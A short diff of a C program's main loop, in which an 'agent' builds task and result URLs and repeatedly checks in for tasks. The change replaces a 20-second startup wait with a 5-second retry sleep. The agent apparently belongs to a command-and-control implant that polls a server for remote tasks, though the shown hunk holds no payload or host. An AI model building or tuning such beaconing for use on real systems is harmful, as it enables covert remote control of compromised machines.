@@ -49,12 +49,12 @@ int main(void)
     create_tasks_url(sa.response, &agent);
     create_results_url(&agent, &task);
 
-    puts("Give you time to create tasks\n");
-    sleep(20);
+    puts("Checking in for tasks\n");
     while(true) {
-        puts("Checking tasks\n");
         if(!check_tasks(&agent, &sa)) {
             puts("No tasks during check in.\n");
+            puts("Checking back in for more tasks shortly.\n");
+            sleep(5);
             continue;
         }
         if(!parse_tasks(sa.response, &task)) {
